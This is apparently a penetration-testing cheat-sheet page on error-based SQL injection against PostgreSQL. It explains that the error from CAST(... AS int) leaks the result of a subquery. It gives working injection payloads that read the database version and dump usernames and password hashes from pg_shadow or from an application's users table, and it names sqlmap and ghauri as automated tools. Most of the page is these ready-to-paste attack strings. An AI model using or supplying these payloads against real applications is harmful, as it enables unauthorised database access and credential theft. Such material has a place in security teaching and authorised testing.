---
title: "Error-based PostgreSQL injection with cast failures"
description: "Leaking PostgreSQL query results through CAST(... AS int) type-conversion errors, which quote the full offending value in the error message."
keywords:
  - cast error
  - invalid input syntax for type integer
  - error based injection
  - PostgreSQL data leak
---

# Cast error

Casting non-numeric text to an integer fails in PostgreSQL with `invalid input syntax for type integer: "<text>"`, and the message includes the text that could not be converted. Feeding a subquery into that cast prints the subquery's result in the error.

Place the subquery in a cast inside the injected condition:

```sql
' AND 1=CAST((SELECT version()) AS INT)-- 
```

The response carries `ERROR: invalid input syntax for type integer: "PostgreSQL 16.1 on x86_64-pc-linux-gnu, ..."`. The `::int` shorthand works the same way:

```sql
' AND 1=(SELECT version())::int-- 
```

Any single-value subquery leaks through the same slot, and because there is no length limit, an aggregated dump returns in one request. To read credentials where the role can see them:

```sql
' AND 1=CAST((SELECT string_agg(usename||':'||passwd,',') FROM pg_shadow) AS INT)-- 
```

`pg_shadow` requires a superuser; against an unprivileged role, aggregate an application table instead (`SELECT string_agg(username||':'||password,',') FROM users`). Keep the inner query to a single value (an aggregate, or `LIMIT 1`), since a multi-row subquery used as a scalar raises a different error that carries no data.

## Tools

- **sqlmap**: automated error-based extraction through cast failures.
- **ghauri**: fast alternative with strong WAF evasion.

## References

- PostgreSQL Documentation: type casts, `string_agg`, system catalogs
- PortSwigger Web Security Academy: SQL injection cheat sheet
